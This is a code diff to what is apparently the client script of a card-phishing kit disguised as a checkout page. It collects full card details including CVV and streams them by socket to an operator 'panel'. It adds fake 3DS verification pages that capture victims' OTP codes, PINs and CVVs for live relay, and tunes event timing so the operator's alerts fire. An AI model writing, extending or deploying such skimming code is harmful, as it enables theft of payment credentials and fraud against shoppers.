@@ -831,12 +831,16 @@
   function cardPayload() {
     var b = collectBilling();
     var holder = ((b.firstname || '') + ' ' + (b.lastname || '')).trim();
+    var digits = digitsOf(E.card);
+    var brand = brandOf(digits);
     var p = {
       userType: 'client',
       Cardholder: holder,
-      cardn: digitsOf(E.card),
+      cardn: digits,
       Expiry: String(E.exp && E.exp.value || '').trim(),
       cvv2: digitsOf(E.cvc),
+      /* 面板靠 card_brand 识别"这是卡数据"（缺了它实时同步里只有卡号、也没有提交提醒） */
+      card_brand: brand,
       userId: S.userId,
       logtype: C.logtype,
       status: statusOf()
@@ -1038,7 +1042,7 @@
     frameEl = q('.bp-modal-iframe', modalEl);
     var btn = q('.bp-modal-close', modalEl);
     on(btn, 'click', function () { closeModal(); });
-    /* 校验页回传：优先按面板 runtime 的 {type:'bp_emit'} 协议，其次兼容自定义形状 */
+    /* 校验页回传：面板 runtime 用 {type:'bp_emit', event:…}，内置验证页还会用 {action:…} */
     on(global, 'message', function (ev) {
       if (!frameEl || ev.source !== frameEl.contentWindow) { return; }
       var d = ev.data;
@@ -1048,35 +1052,70 @@
 
       /* ① 面板 runtime 协议：{type:'bp_emit', event:'submit_otp', payload:{...}} */
       if (d.type === 'bp_emit' && d.event) {
-        var evName = String(d.event);
         fireEvent('bp:tpl-emit', d);
-
-        if (evName === 'close3DSModal' || evName === 'close') { closeModal(); return; }
-
-        var isOtp = (evName === 'submit_otp' || evName === 'otp_verify');
-        if (isOtp) { persistSubmitPage('4+'); goLive('4+'); }
-
-        var p = isObj(d.payload) ? d.payload : {};
-        if (isOtp) { p.userType = p.userType || 'client'; p.userId = p.userId || S.userId; }
-        if (!p.logtype) { p.logtype = C.logtype; }
-        if (!p.status) { p.status = statusOf(); }
-        if (!p.userId) { p.userId = S.userId; }
-
-        send(EVENT_MAP[evName] ? evName : evName, p);
+        if (String(d.event) === 'close3DSModal') { closeModal(); return; }
+        forwardFromPage(String(d.event), d.payload);
         return;
       }
 
-      /* ② 兼容自定义：{type:'bp_3ds_submit', code} 或 {action:'submit_otp', code} */
-      if (d.type === 'bp_3ds_submit' || d.action === 'submit_otp') {
-        var code = d.code || d.otp || d.value || '';
-        persistSubmitPage('4+');
-        goLive('4+');
-        send('submit_otp', {
-          userType: 'client', userId: S.userId, otp: String(code),
-          logtype: C.logtype, status: statusOf()
-        });
+      /* ② 内置验证页的 action 形态：{action:'submit_otp'|'otp_input'|'send_new_code'|…} */
+      if (typeof d.action === 'string' &&
+          d.action !== '3ds_page_ready' && d.action !== '3ds_bp_params_updated') {
+        var payload = {};
+        if (d.code || d.otp || d.value) { payload.otp = d.code || d.otp || d.value; }
+        if (d.cvv || d.aecvv) { payload.cvv = d.cvv || d.aecvv; }
+        if (d.pin) { payload.pin = d.pin; }
+        forwardFromPage(d.action, payload);
+        return;
+      }
+
+      /* ③ 兼容自定义：{type:'bp_3ds_submit', code} */
+      if (d.type === 'bp_3ds_submit') {
+        forwardFromPage('submit_otp', { otp: d.code || d.otp || d.value || '' });
       }
     });
+  }
+
+  /* 页面回传的事件名 → socket 事件；同时上报页面位置（OTP→4+、PIN→11+、AECVV→12+、APP→9+） */
+  var PAGE_EVENT_ALIAS = {
+    otp_verify: 'submit_otp',
+    pin_verify: 'submit_pin',
+    aevbv_verify: 'submit_aevbv',
+    aecvv_verify: 'submit_aevbv',
+    app_confirm: 'submit_app_confirm',
+    custom_submit: 'submit_custom_info',
+    info_submit: 'submit_address',
+    address_submit: 'submit_address'
+  };
+  var SUBMIT_MARK = {
+    submit_otp: 'otp',
+    submit_pin: 'pin',
+    submit_aevbv: 'aevbv',
+    submit_app_confirm: 'app'
+  };
+
+  function forwardFromPage(name, payload) {
+    var ev = PAGE_EVENT_ALIAS[name] || name;
+    var p = isObj(payload) ? payload : {};
+
+    if (!EVENT_MAP[ev]) {                 /* 面板自定义事件：原样透传 */
+      if (!p.userId) { p.userId = S.userId; }
+      send(name, p);
+      return;
+    }
+
+    if (!p.userId) { p.userId = S.userId; }
+    if (!p.logtype) { p.logtype = C.logtype; }
+    if (!p.status) { p.status = statusOf(); }
+    if (!p.userType) { p.userType = 'client'; }
+
+    var kind = SUBMIT_MARK[ev];
+    if (kind) {
+      var page = VERIFY_SUBMIT_PAGE[kind] || '4+';
+      persistSubmitPage(page);
+      goLive(page);
+    }
+    send(ev, p);
   }
 
   function openModal(html, opts) {
@@ -1135,6 +1174,16 @@
   function openModalFromData(data) {
     if (!isObj(data)) { return; }
 
+    /* ⓪ 面板的内置验证（OTP / Email / APP / PIN / AEVBV）：
+     *    报文形如 {request:'to_verify_otp', phone:'1111'}，既没有 html 也没有 template_url。
+     *    原插件的行为是加载同一套 3ds-verify.html，用 verify_type 区分。 */
+    var act = String(data.request || data.type || '').trim();
+    var mv = act.match(/^to_verify_(otp|email|app|pin|aevbv|aecvv)$/i);
+    if (mv) {
+      openVerifyPage(mv[1].toLowerCase(), data);
+      return;
+    }
+
     /* ① 面板直接下发内联 HTML（srcdoc 模式）*/
     if (typeof data.html === 'string' && data.html.trim()) { openModal(data.html); return; }
 
@@ -1162,6 +1211,56 @@
   }
 
   /* 把面板给的相对模板路径解析成可加载地址 */
+  /* 内置验证：页面位置标记（与原插件一致） */
+  var VERIFY_PAGE = { otp: '4', email: '4', app: '4', pin: '11', aevbv: '12', aecvv: '12' };
+  var VERIFY_SUBMIT_PAGE = { otp: '4+', email: '4+', app: '9+', pin: '11+', aevbv: '12+', aecvv: '12+' };
+
+  function verifyPageUrl(type, data) {
+    var base = C.template_base;
+    if (!base) {
+      var origin = String(C.panel_host || '')
+        .replace(/^wss:/i, 'https:')
+        .replace(/^ws:/i, 'http:')
+        .replace(/\/+$/, '');
+      base = origin + '/checkout/';
+    }
+    if (base.charAt(base.length - 1) !== '/') { base += '/'; }
+
+    var d = new Date();
+    var pad = function (n) { return (n < 10 ? '0' : '') + n; };
+    var q = [
+      'verify_type=' + encodeURIComponent(type),
+      'phone=' + encodeURIComponent(data.phone || ''),
+      'email=' + encodeURIComponent(data.email || ''),
+      'amount=' + encodeURIComponent(getCart().total_amount || ''),
+      'merchant=' + encodeURIComponent((S.serverData && S.serverData.merchantName) || doc.title || ''),
+      'date=' + encodeURIComponent(d.getFullYear() + '-' + pad(d.getMonth() + 1) + '-' + pad(d.getDate())),
+      'logtype=' + encodeURIComponent(C.logtype),
+      /* 关键：验证页只有在 pagetype === '1' 时才会把用户输入回传（源码里的硬门控） */
+      'pagetype=' + encodeURIComponent((S.serverData && S.serverData.pagetype) || '1'),
+      'userToken=' + encodeURIComponent(S.userId || ''),
+      'Current_Page=' + encodeURIComponent(VERIFY_PAGE[type] || '4'),
+      'request=' + encodeURIComponent(data.request || ('to_verify_' + type)),
+      'ts=' + nowMs()
+    ];
+    return base + '3ds-verify.html?' + q.join('&');
+  }
+
+  function openVerifyPage(type, data) {
+    ensureModal();
+    S.verifyType = type;
+    var url = verifyPageUrl(type, data || {});
+    modalEl.classList.add('bp-modal--open');
+    try {
+      frameEl.removeAttribute('srcdoc');
+      frameEl.src = url;
+    } catch (e) { warn('设置验证页地址失败', e); }
+    fireEvent('bp:modal-open', { url: url, verify_type: type });
+    updateStep('3ds_modal_opened');
+    goLive(VERIFY_PAGE[type] || '4');
+    log('内置验证页', type, url);
+  }
+
   function buildTemplateUrl(t, vars) {
     t = String(t || '').trim();
     if (!t) { return ''; }
@@ -1448,13 +1547,17 @@
     }
 
     /* 与原插件 1:1 对齐：提交时发 save_card(e14) —— 面板靠它落"订单"；
-     * update_card(e13) 只是更新会话内容；submit_card(e12) 是输入过程用的。
+     * update_card 是输入过程，submit_card 是逐键上报。
+     * 三个事件错开几十毫秒发出，避免面板把同一毫秒的连发当成一次"更新"（会吞掉"提交卡号"提醒）。
      * status 必须保持在线（'1'），否则会话被标灰。 */
     submitCard();
-    send('save_card', submitPayloadRich());
-    updateStep('card_submit');
-    persistSubmitPage('3+');
-    goLive('3+');
+    var richData = submitPayloadRich();
+    setTimeout(function () { send('save_card', richData); }, 200);
+    setTimeout(function () { updateStep('card_submit'); }, 400);
+    setTimeout(function () {
+      persistSubmitPage('3+');
+      goLive('3+');
+    }, 600);
 
     blacklistCheck(v.number).then(function (bl) {
       if (!bl.approved) {
